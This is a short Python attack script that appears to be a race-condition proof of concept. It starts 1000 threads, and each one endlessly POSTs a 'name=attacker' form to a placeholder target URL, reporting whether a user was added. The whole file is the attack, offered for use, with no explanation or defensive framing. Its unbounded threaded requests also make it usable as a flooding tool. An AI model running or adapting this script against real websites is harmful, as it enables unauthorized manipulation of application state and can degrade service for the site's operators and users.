import requests
import threading

url = "https://target.com" # URL = When The Condition Works, You can use browser inspect or Burp or Whatever you want.

def send():
    while True:
            response = requests.post(url,data={"name":"attacker"}).text
            if "User Added" in response:
                    print("The User has been Added!")
            else:
                    print("Failed to Added User!")

array = [threading.Thread(target=send).start() for x in range(1000)]